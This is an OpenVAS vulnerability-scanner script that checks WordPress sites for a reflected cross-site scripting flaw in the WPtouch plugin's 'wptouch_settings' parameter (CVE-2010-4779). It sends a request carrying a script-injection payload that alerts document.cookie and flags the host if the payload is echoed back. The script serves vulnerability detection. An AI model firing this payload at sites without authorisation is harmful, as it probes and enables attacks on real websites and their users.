###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wptouch_plugin_wptouch_settings_xss.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# WordPress WPtouch Plugin 'wptouch_settings' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802014");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_bugtraq_id(45139);
  script_cve_id("CVE-2010-4779");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress WPtouch Plugin 'wptouch_settings' Parameter Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/42438");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/xss_in_wptouch_wordpress_plugin.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress WPtouch Plugin 1.9.19.4 and 1.9.20, other versions
  may also be affected.");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'wptouch_settings'
  parameter to 'wp-content/plugins/wptouch/include/adsense-new.php', which
  is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Upgrade to 3.1.1 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress WPtouch Plugin and is
  prone to cross-site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wptouch");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

if(dir == "/") dir = "";
url = dir + "/wp-content/plugins/wptouch/include/adsense-new.php?wptouch_settings[adsense-id]=',};//--></script><script>alert(document.cookie);</script><!--";

if(http_vuln_check(port:port, url:url, pattern:"><script>alert\(document\.cookie\);</script><!--", check_header:TRUE)){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);